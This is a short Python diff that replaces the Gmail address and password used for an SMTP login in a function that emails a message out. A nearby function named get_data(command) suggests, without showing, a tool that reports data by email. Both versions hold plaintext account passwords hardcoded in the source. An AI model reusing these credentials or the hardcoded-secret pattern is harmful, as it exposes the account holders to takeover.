@@ -8,9 +8,9 @@ def send_data(message="no_data"):
     # start TLS for security
     s.starttls()
     # Authentication
-    s.login("ashrafatef136@gmail.com", "btib dcas ksel osmj")
+    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
     # sending the mail
-    s.sendmail("ashrafatef136@gmail.com", "ashrafatef368@gmail.com", message)
+    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
     # terminating the session
     s.quit()
 def get_data(command):
